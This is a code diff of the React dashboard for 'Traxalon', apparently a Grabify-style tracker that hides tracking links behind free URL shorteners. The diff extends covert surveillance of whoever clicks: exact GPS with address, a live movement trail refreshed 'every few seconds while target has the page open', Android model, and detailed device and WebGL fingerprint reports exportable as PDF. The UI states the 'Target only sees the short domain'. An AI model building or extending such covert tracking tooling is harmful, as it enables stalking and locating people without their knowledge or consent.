@@ -64,18 +64,6 @@ export default function Dashboard() {
     return "https://" + t;
   }
 
-  // async function shortenUrl(longUrl, provider) {
-  //   try {
-  //     const res = await fetch(BACKEND_URL + "/api/links/shorten-url", {
-  //       method: "POST",
-  //       headers: { "Content-Type": "application/json" },
-  //       body: JSON.stringify({ url: longUrl, provider }),
-  //     });
-  //     const data = await res.json();
-  //     return data.shortUrl || longUrl;
-  //   } catch { return longUrl; }
-  // }
-
   async function shortenUrl(longUrl, provider) {
     try {
       const res = await fetch(BACKEND_URL + "/api/links/shorten-url", {
@@ -84,15 +72,14 @@ export default function Dashboard() {
         body: JSON.stringify({ url: longUrl, provider }),
       });
       const data = await res.json();
-      // If returned URL is same as original, shortening failed
-      if (data.shortUrl === longUrl) {
+      if (!data.shortUrl || data.shortUrl === longUrl) {
         console.warn("Shortening failed for provider:", provider);
-        return longUrl;
+        return null;
       }
-      return data.shortUrl || longUrl;
-    } catch { return longUrl; }
+      return data.shortUrl;
+    } catch { return null; }
   }
-  
+
   async function handleGenerate(e) {
     e.preventDefault();
     if (credits < 1) { setShowPayment(true); return; }
@@ -117,7 +104,7 @@ export default function Dashboard() {
       setSuccess(data.trackingUrl);
       setShortening(true);
       const short = await shortenUrl(data.trackingUrl, shortenerProvider);
-      setShortUrl(short);
+      setShortUrl(short || "FAILED");
       setShortening(false);
       setLabel("");
       setDestinationUrl("");
@@ -140,7 +127,6 @@ export default function Dashboard() {
     <div className="min-h-screen bg-surface pt-16 text-text-primary">
       <div className="max-w-5xl mx-auto px-4 py-8">
 
-        {/* Server status banner */}
         {serverWaking && (
           <div className="mb-4 flex items-center gap-2 bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 rounded-xl px-4 py-3 font-body text-sm">
             <div className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse flex-shrink-0" />
@@ -160,7 +146,6 @@ export default function Dashboard() {
           </div>
         )}
 
-        {/* Header */}
         <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
           <div>
             <h1 className="font-display text-4xl tracking-wider">COMMAND <span className="text-primary">CENTER</span></h1>
@@ -183,7 +168,6 @@ export default function Dashboard() {
           </div>
         </div>
 
-        {/* Stats */}
         <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
           {[
             { label: "Total Links", value: links.length, icon: <Link2 className="w-4 h-4" /> },
@@ -198,7 +182,7 @@ export default function Dashboard() {
           ))}
         </div>
 
-        {/* ── GENERATE LINK ── */}
+        {/* GENERATE LINK */}
         <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 mb-6">
           <h2 className="font-display text-xl tracking-wider mb-1">GENERATE <span className="text-primary">LINK</span></h2>
           <p className="font-body text-xs text-text-muted mb-6">
@@ -211,7 +195,6 @@ export default function Dashboard() {
             </div>
           )}
 
-          {/* Form */}
           <form onSubmit={handleGenerate}>
             <div className="flex flex-col md:flex-row gap-3 mb-3">
               <div className="flex-1 relative">
@@ -245,36 +228,30 @@ export default function Dashboard() {
             </p>
           </form>
 
-          {/* Generated links shown BELOW form */}
           {success && (
             <div className="mt-6 border-t border-surface-border pt-6 space-y-4">
               <p className="font-body text-xs text-green-400 font-semibold flex items-center gap-1.5">
                 <CheckCircle className="w-4 h-4" /> Tracking link generated successfully!
               </p>
 
-              {/* Full tracking link */}
               <div className="bg-surface border border-surface-border rounded-xl p-4">
                 <p className="font-body text-xs text-text-muted uppercase tracking-wider mb-2">Full Tracking Link</p>
                 <div className="flex items-center gap-3">
                   <Link2 className="w-4 h-4 text-text-muted flex-shrink-0" />
                   <span className="font-mono text-xs text-text-secondary flex-1 truncate">{success}</span>
-                  <button
-                    onClick={() => copyToClipboard(success, "full")}
-                    className="flex items-center gap-1.5 px-3 py-1.5 bg-surface-border text-text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors flex-shrink-0"
-                  >
+                  <button onClick={() => copyToClipboard(success, "full")}
+                    className="flex items-center gap-1.5 px-3 py-1.5 bg-surface-border text-text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors flex-shrink-0">
                     {copiedId === "full" ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied</> : <><Copy className="w-3 h-3" /> Copy</>}
                   </button>
                 </div>
               </div>
 
-              {/* Short link with provider dropdown — Grabify style */}
               <div className="bg-primary/10 border border-primary/40 rounded-xl p-4">
                 <div className="flex items-center justify-between mb-3 gap-3 flex-wrap">
                   <p className="font-body text-xs text-primary uppercase tracking-wider font-semibold flex items-center gap-1.5">
                     <Scissors className="w-3.5 h-3.5" /> Short Link
                     {shortening && <span className="text-yellow-400 animate-pulse ml-2">generating...</span>}
                   </p>
-                  {/* Provider dropdown */}
                   <div className="flex items-center gap-2">
                     <span className="font-body text-xs text-text-muted">Domain:</span>
                     <select
@@ -286,7 +263,7 @@ export default function Dashboard() {
                           setShortening(true);
                           setShortUrl("");
                           shortenUrl(success, prov).then(s => {
-                            setShortUrl(s);
+                            setShortUrl(s || "FAILED");
                             setShortening(false);
                           });
                         }
@@ -296,20 +273,23 @@ export default function Dashboard() {
                       <option value="isgd">is.gd — random (free)</option>
                       <option value="vgd">v.gd — random (free)</option>
                       <option value="tinyurl">tinyurl.com (free)</option>
+                      <option value="cleanuri">cleanuri.com (free)</option>
+                      <option value="dagd">da.gd (free)</option>
+                      <option value="ulvis">ulvis.net (free)</option>
                     </select>
                   </div>
                 </div>
                 <div className="flex items-center gap-3">
                   <Globe className="w-4 h-4 text-primary flex-shrink-0" />
-                  <span className="font-mono text-sm text-primary font-bold flex-1 truncate">
-                    {shortening ? "Shortening..." : (shortUrl || success)}
+                  <span className={`font-mono text-sm font-bold flex-1 truncate ${shortUrl === "FAILED" ? "text-red-400" : "text-primary"}`}>
+                    {shortening ? "Shortening..." : shortUrl === "FAILED" ? "Provider unavailable — try another domain" : (shortUrl || success)}
                   </span>
-                  <button
-                    onClick={() => copyToClipboard(shortUrl || success, "short")}
-                    className="flex items-center gap-1.5 px-4 py-1.5 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors flex-shrink-0"
-                  >
-                    {copiedId === "short" ? <><CheckCircle className="w-3 h-3" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
-                  </button>
+                  {shortUrl !== "FAILED" && (
+                    <button onClick={() => copyToClipboard(shortUrl || success, "short")}
+                      className="flex items-center gap-1.5 px-4 py-1.5 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors flex-shrink-0">
+                      {copiedId === "short" ? <><CheckCircle className="w-3 h-3" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
+                    </button>
+                  )}
                 </div>
                 <p className="font-body text-xs text-text-muted mt-2">
                   ↑ Target only sees the short domain — Traxalon is completely hidden
@@ -319,7 +299,7 @@ export default function Dashboard() {
           )}
         </div>
 
-        {/* ── TRACKING LINKS ── latest first */}
+        {/* TRACKING LINKS */}
         <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
           <h2 className="font-display text-xl tracking-wider mb-6">TRACKING <span className="text-primary">LINKS</span></h2>
 
@@ -333,8 +313,6 @@ export default function Dashboard() {
             <div className="space-y-4">
               {links.map((link) => (
                 <div key={link.id} className="bg-surface border border-surface-border rounded-2xl overflow-hidden">
-
-                  {/* Link header */}
                   <div
                     className="p-5 flex items-start justify-between gap-3 cursor-pointer hover:bg-primary/5 transition-all"
                     onClick={() => setSelectedLink(selectedLink?.id === link.id ? null : link)}
@@ -366,14 +344,12 @@ export default function Dashboard() {
                     <ChevronRight className={`w-5 h-5 text-text-muted transition-transform flex-shrink-0 mt-1 ${selectedLink?.id === link.id ? "rotate-90" : ""}`} />
                   </div>
 
-                  {/* Stats */}
                   <div className="px-5 pb-4 flex items-center gap-6 text-xs text-text-muted font-body border-t border-surface-border/40 pt-3">
                     <span className="flex items-center gap-1.5"><Eye className="w-3.5 h-3.5" />{link.clicks || 0} clicks</span>
                     <span className="flex items-center gap-1.5"><Smartphone className="w-3.5 h-3.5" />{link.captures?.length || 0} captures</span>
                     <span className="flex items-center gap-1.5"><Clock className="w-3.5 h-3.5" />{link.createdAt ? new Date(link.createdAt.toMillis()).toLocaleDateString("en-IN") : "-"}</span>
                   </div>
 
-                  {/* Captures — latest first, each as separate tab */}
                   {selectedLink?.id === link.id && (
                     <div className="border-t border-surface-border">
                       {(!link.captures || link.captures.length === 0) ? (
@@ -392,8 +368,6 @@ export default function Dashboard() {
                             const hasGPS = capture.gpsLat && capture.gpsLon;
                             return (
                               <div key={i} className={`border rounded-2xl overflow-hidden transition-all ${isOpen ? "border-primary/50 shadow-glow" : "border-surface-border"}`}>
-
-                                {/* Tab header — IP + Browser only, no OS/city */}
                                 <button
                                   className="w-full flex items-center justify-between p-4 hover:bg-primary/5 transition-colors"
                                   onClick={() => setOpenCapture(isOpen ? null : tabKey)}
@@ -415,6 +389,11 @@ export default function Dashboard() {
                                     </div>
                                   </div>
                                   <div className="flex items-center gap-2 flex-shrink-0">
+                                    {capture.isMoving && (
+                                      <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 animate-pulse font-mono">
+                                        🚶 MOVING
+                                      </span>
+                                    )}
                                     <span className={`text-xs px-2.5 py-1 rounded-full font-mono border ${hasGPS ? "bg-green-500/10 text-green-400 border-green-500/20" : "bg-primary/10 text-primary border-primary/20"}`}>
                                       {hasGPS ? "📍 GPS" : "🌐 IP"}
                                     </span>
@@ -422,7 +401,6 @@ export default function Dashboard() {
                                   </div>
                                 </button>
 
-                                {/* Tab content */}
                                 {isOpen && (
                                   <div className="border-t border-surface-border">
                                     <div className="flex justify-end p-3 border-b border-surface-border/50 bg-surface/50">
@@ -493,7 +471,7 @@ function exportPDF(capture, linkLabel) {
   if (capture.gpsLat && capture.gpsLon) {
     sec("3. GPS LOCATION (EXACT)", [["GPS Coordinates", capture.gpsLat + ", " + capture.gpsLon],["Accuracy", capture.gpsAccuracy ? capture.gpsAccuracy + " metres" : null],["Altitude", capture.gpsAltitude ? capture.gpsAltitude + " m" : null],["Speed", capture.gpsSpeed ? capture.gpsSpeed + " m/s" : null],["Heading", capture.gpsHeading],["Full Address", capture.gpsAddress],["City", capture.gpsCity],["State", capture.gpsState],["Pincode", capture.gpsPincode],["Country", capture.gpsCountry]]);
   }
-  sec("4. DEVICE", [["Device Type", capture.device],["OS", capture.os],["Browser", capture.browser],["Browser Version", capture.browserVersion],["Platform", capture.platform],["Architecture", capture.architecture],["CPU Cores", capture.cpuCores],["RAM", capture.ram ? capture.ram + " GB" : null],["GPU", capture.gpu],["GPU Vendor", capture.gpuVendor],["Touch Points", capture.maxTouchPoints],["Vendor", capture.vendor],["App Name", capture.appName],["Product", capture.product],["Build ID", capture.buildID]]);
+  sec("4. DEVICE", [["Device Type", capture.device],["Android Model", capture.androidModel],["OS", capture.os],["Browser", capture.browser],["Browser Version", capture.browserVersion],["Platform", capture.platform],["Architecture", capture.architecture],["CPU Cores", capture.cpuCores],["RAM", capture.ram ? capture.ram + " GB" : null],["GPU", capture.gpu],["GPU Vendor", capture.gpuVendor],["Touch Points", capture.maxTouchPoints],["Vendor", capture.vendor],["App Name", capture.appName],["Product", capture.product],["Build ID", capture.buildID]]);
   sec("5. WEBGL / GPU", [["WebGL Version", capture.webglVersion],["Renderer", capture.webglRenderer],["Vendor", capture.webglVendor],["Shading Language", capture.webglShadingLanguage],["Max Texture Size", capture.maxTextureSize],["Max Viewport", capture.maxViewportDims],["Extensions Count", capture.webglExtensionsCount],["WebGL2", capture.webgl2Support != null ? String(capture.webgl2Support) : null],["Shader Precision", capture.shaderPrecision],["WebGL Hash", capture.webglHash]]);
   sec("6. SCREEN", [["Resolution", capture.screenWidth ? capture.screenWidth + "x" + capture.screenHeight : null],["Available", capture.screenAvailWidth ? capture.screenAvailWidth + "x" + capture.screenAvailHeight : null],["Window", capture.windowWidth ? capture.windowWidth + "x" + capture.windowHeight : null],["Pixel Ratio", capture.pixelRatio],["Color Depth", capture.colorDepth ? capture.colorDepth + " bit" : null],["Orientation", capture.orientation],["HDR", capture.hdrSupport],["Color Gamut", capture.colorGamut],["Dark Mode", capture.prefersColorScheme]]);
   sec("7. BATTERY", [["Level", capture.batteryLevel != null ? capture.batteryLevel + "%" : null],["Charging", capture.batteryCharging != null ? (capture.batteryCharging ? "Yes" : "No") : null],["Charging Time", capture.batteryChargingTime ? capture.batteryChargingTime + "s" : null],["Discharging", capture.batteryDischargingTime ? capture.batteryDischargingTime + "s" : null]]);
@@ -549,24 +527,64 @@ function CaptureCard({ capture, index }) {
           <DataRow label="GPS Coords" value={capture.gpsLat + ", " + capture.gpsLon} />
           <DataRow label="Accuracy" value={capture.gpsAccuracy ? capture.gpsAccuracy + " metres" : null} />
           <DataRow label="Altitude" value={capture.gpsAltitude ? capture.gpsAltitude + " m" : null} />
-          <DataRow label="Speed" value={capture.gpsSpeed ? capture.gpsSpeed + " m/s" : null} />
+          <DataRow label="Speed" value={capture.gpsSpeed ? (capture.gpsSpeed * 3.6).toFixed(1) + " km/h" : null} />
           <DataRow label="Heading" value={capture.gpsHeading} />
+          <DataRow label="Is Moving" value={capture.isMoving != null ? (capture.isMoving ? "🚶 Yes — Moving" : "🛑 No — Stationary") : null} />
           <DataRow label="Address" value={capture.gpsAddress} />
           <DataRow label="City" value={capture.gpsCity} />
           <DataRow label="State" value={capture.gpsState} />
           <DataRow label="Pincode" value={capture.gpsPincode} />
           <DataRow label="Country" value={capture.gpsCountry} />
           <div className="col-span-2 mt-2">
-            <div className="rounded-xl overflow-hidden border border-surface-border mb-3" style={{ height: 200 }}>
-              <iframe title={"map-" + index} width="100%" height="100%" frameBorder="0"
-                src={"https://maps.google.com/maps?q=" + capture.gpsLat + "," + capture.gpsLon + "&z=16&output=embed"} allowFullScreen />
+            <div className="rounded-xl overflow-hidden border border-surface-border mb-3" style={{ height: 220 }}>
+              <iframe
+                title={"map-" + index}
+                width="100%"
+                height="100%"
+                frameBorder="0"
+                src={"https://maps.google.com/maps?q=" + capture.gpsLat + "," + capture.gpsLon + "&z=16&output=embed"}
+                allowFullScreen
+              />
             </div>
-            <a href={"https://www.google.com/maps?q=" + capture.gpsLat + "," + capture.gpsLon}
-              target="_blank" rel="noreferrer"
-              className="inline-flex items-center gap-2 px-4 py-2 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors">
-              📍 Open in Google Maps
+            <a
+              href={"https://www.google.com/maps?q=" + capture.gpsLat + "," + capture.gpsLon}
+              target="_blank"
+              rel="noreferrer"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors"
+            >
+              📍 Open Exact Location in Google Maps
             </a>
           </div>
+          {capture.locationHistory && capture.locationHistory.length > 0 && (
+            <div className="col-span-2 mt-3">
+              <div className="font-body text-xs text-primary uppercase tracking-wider mb-2 flex items-center gap-2">
+                🗺️ Movement Trail ({capture.locationHistory.length} location points)
+                {capture.isMoving && <span className="text-yellow-400 animate-pulse font-bold">● CURRENTLY MOVING</span>}
+              </div>
+              <div className="bg-surface border border-surface-border rounded-xl p-3 space-y-1.5 max-h-48 overflow-y-auto">
+                {[...capture.locationHistory].reverse().map((loc, idx) => (
+                  <div key={idx} className="flex items-center gap-2 text-xs">
+                    <span className={`w-2 h-2 rounded-full flex-shrink-0 ${loc.isMoving ? "bg-yellow-400" : "bg-green-400"}`} />
+                    <span className="font-mono text-text-primary">
+                      {Number(loc.lat).toFixed(5)}, {Number(loc.lon).toFixed(5)}
+                    </span>
+                    {loc.speed != null && loc.speed > 0 && (
+                      <span className="text-primary font-semibold">{(loc.speed * 3.6).toFixed(1)} km/h</span>
+                    )}
+                    {loc.accuracy && (
+                      <span className="text-text-muted">±{Math.round(loc.accuracy)}m</span>
+                    )}
+                    <span className="text-text-muted ml-auto flex-shrink-0">
+                      {new Date(loc.timestamp).toLocaleTimeString("en-IN")}
+                    </span>
+                  </div>
+                ))}
+              </div>
+              <p className="font-body text-xs text-text-muted mt-1.5">
+                🟢 Stationary &nbsp;·&nbsp; 🟡 Moving — Updates every few seconds while target has the page open
+              </p>
+            </div>
+          )}
         </Section>
       )}
 
@@ -583,6 +601,7 @@ function CaptureCard({ capture, index }) {
 
       <Section title="📱 Device Hardware">
         <DataRow label="Device Type" value={capture.device} />
+        <DataRow label="Android Model" value={capture.androidModel} />
         <DataRow label="OS" value={capture.os} />
         <DataRow label="Browser" value={capture.browser} />
         <DataRow label="Browser Version" value={capture.browserVersion} />
